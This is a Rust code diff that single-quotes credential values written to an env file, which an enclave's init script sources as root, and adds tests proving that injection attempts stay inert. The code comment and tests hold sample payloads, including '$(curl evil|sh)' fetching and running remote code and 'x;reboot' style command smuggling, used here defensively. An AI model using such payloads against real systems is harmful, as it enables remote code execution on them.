@@ -425,7 +425,22 @@ fn render_env_file(creds: &BTreeMap<String, Vec<u8>>) -> Result<String, String> 
         }
         body.push_str(name);
         body.push('=');
-        body.push_str(value);
+        // Single-quote the value so init.sh's `. /run/aws-creds.env`
+        // treats it as a literal string. The host is untrusted and
+        // controls these bytes, so an unquoted `KEY=value` would let a
+        // value like `x;reboot` or `$(curl evil|sh)` execute as a command
+        // in the enclave's init (PID 1, root) when the file is sourced.
+        // Inside single quotes nothing is special except `'` itself, which
+        // we close-escape-reopen as `'\''` (the canonical POSIX trick).
+        body.push('\'');
+        for c in value.chars() {
+            if c == '\'' {
+                body.push_str("'\\''");
+            } else {
+                body.push(c);
+            }
+        }
+        body.push('\'');
         body.push('\n');
     }
     Ok(body)
@@ -523,6 +538,52 @@ mod tests {
             .collect()
     }
 
+    // ---- render_env_file: shell-injection safety ----------------------
+
+    #[test]
+    fn render_env_file_single_quotes_values() {
+        // Even benign creds are single-quoted, so the sourced value is a
+        // literal regardless of content. BTreeMap orders keys lexically.
+        let out = render_env_file(&secrets_from(&[
+            ("AWS_REGION", "eu-central-1"),
+            ("AWS_SECRET_ACCESS_KEY", "a/b+c="),
+        ]))
+        .unwrap();
+        assert_eq!(
+            out,
+            "AWS_REGION='eu-central-1'\nAWS_SECRET_ACCESS_KEY='a/b+c='\n"
+        );
+    }
+
+    #[test]
+    fn render_env_file_neutralizes_injection_payloads() {
+        // A hostile host controls these bytes; none may execute when
+        // init.sh sources the file. Single-quoting makes each a literal.
+        assert_eq!(
+            render_env_file(&secrets_from(&[("AWS_SESSION_TOKEN", "x;reboot")])).unwrap(),
+            "AWS_SESSION_TOKEN='x;reboot'\n"
+        );
+        assert_eq!(
+            render_env_file(&secrets_from(&[("AWS_SESSION_TOKEN", "$(curl evil|sh)")])).unwrap(),
+            "AWS_SESSION_TOKEN='$(curl evil|sh)'\n"
+        );
+    }
+
+    #[test]
+    fn render_env_file_escapes_embedded_single_quote() {
+        // A `'` would otherwise close the quoting and break out; it must
+        // be close-escape-reopened as `'\''`.
+        assert_eq!(
+            render_env_file(&secrets_from(&[("AWS_REGION", "a'b")])).unwrap(),
+            "AWS_REGION='a'\\''b'\n"
+        );
+        // A `'`-led breakout attempt stays inert.
+        assert_eq!(
+            render_env_file(&secrets_from(&[("AWS_REGION", "'; reboot #")])).unwrap(),
+            "AWS_REGION=''\\''; reboot #'\n"
+        );
+    }
+
     // ---- argv parsing -------------------------------------------------
 
     #[test]
@@ -617,13 +678,13 @@ mod tests {
             ("AWS_REGION", "eu-central-1"),
         ]);
         let body = render_env_file(&creds).unwrap();
-        // BTreeMap orders keys lexicographically.
+        // BTreeMap orders keys lexicographically; values are single-quoted.
         assert_eq!(
             body,
-            "AWS_ACCESS_KEY_ID=AKIAEXAMPLE\n\
-             AWS_REGION=eu-central-1\n\
-             AWS_SECRET_ACCESS_KEY=abc/def+ghi\n\
-             AWS_SESSION_TOKEN=FwoGZ...\n"
+            "AWS_ACCESS_KEY_ID='AKIAEXAMPLE'\n\
+             AWS_REGION='eu-central-1'\n\
+             AWS_SECRET_ACCESS_KEY='abc/def+ghi'\n\
+             AWS_SESSION_TOKEN='FwoGZ...'\n"
         );
     }
 
@@ -675,7 +736,7 @@ mod tests {
     fn accepts_underscore_leading_env_name() {
         let mut creds = BTreeMap::new();
         creds.insert("_PRIVATE".to_string(), b"x".to_vec());
-        assert_eq!(render_env_file(&creds).unwrap(), "_PRIVATE=x\n");
+        assert_eq!(render_env_file(&creds).unwrap(), "_PRIVATE='x'\n");
     }
 
     #[tokio::test]
@@ -686,7 +747,7 @@ mod tests {
         write_env_file(&path, &creds).await.unwrap();
 
         let read_back = std::fs::read_to_string(&path).unwrap();
-        assert_eq!(read_back, "AWS_REGION=us-east-1\n");
+        assert_eq!(read_back, "AWS_REGION='us-east-1'\n");
 
         #[cfg(unix)]
         {
@@ -705,7 +766,7 @@ mod tests {
         let creds = secrets_from(&[("AWS_REGION", "eu-west-1")]);
         write_env_file(&path, &creds).await.unwrap();
         let read_back = std::fs::read_to_string(&path).unwrap();
-        assert_eq!(read_back, "AWS_REGION=eu-west-1\n");
+        assert_eq!(read_back, "AWS_REGION='eu-west-1'\n");
         std::fs::remove_dir_all(&dir).ok();
     }
 
